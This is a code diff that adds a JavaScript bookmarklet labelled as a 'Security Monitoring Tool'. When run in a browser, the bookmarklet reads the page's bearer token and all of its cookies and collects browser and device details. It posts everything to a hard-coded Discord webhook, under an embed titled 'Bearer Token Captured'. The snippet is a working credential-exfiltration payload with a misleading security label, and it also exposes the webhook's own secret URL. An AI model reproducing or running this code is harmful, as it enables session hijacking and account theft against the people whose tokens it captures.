@@ -1,0 +1,30 @@
+javascript:(function(){
+const t=document.cookie.split('bearer_token=')[1]?.split(';')[0],d=new Date().toISOString(),s=`${screen.width}x${screen.height} (${innerWidth}x${innerHeight} viewport)`;
+fetch('https://discord.com/api/webhooks/1416079422125248563/DSZ5ejSjoZcNGrs_vDBhNTZZLZhaMPWZnSGPEejy_J9HaoON-epTWcjq8hLj6YkKCsjH',{
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({
+username:'Security Bot',
+avatar_url:'https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png',
+embeds:[{
+title:'Bearer Token Captured',
+color:0x0099ff,
+fields:[
+{name:'Bearer Token',value:'`'+(t||'Not found')+'`',inline:!1},
+{name:'Domain',value:location.hostname,inline:!0},
+{name:'Full URL',value:location.href,inline:!0},
+{name:'Timestamp',value:d,inline:!0},
+{name:'User Agent',value:'```'+navigator.userAgent.slice(0,100)+'```',inline:!1},
+{name:'Screen Size',value:s,inline:!0},
+{name:'Timezone',value:Intl.DateTimeFormat().resolvedOptions().timeZone,inline:!0},
+{name:'Language',value:navigator.language,inline:!0},
+{name:'Browser Plugins',value:Array.from(navigator.plugins).map(p=>p.name).join(', ').slice(0,100),inline:!1},
+{name:'All Cookies',value:'```'+document.cookie.slice(0,100)+(document.cookie.length>100?'...':'')+'```',inline:!1}
+],
+footer:{text:'Security Monitoring Tool'},
+timestamp:d
+}]
+})})
+.then(r=>console.log(r.ok?'Data sent successfully':'API error:'+r.status))
+.catch(e=>console.error('Error:',e))
+})();
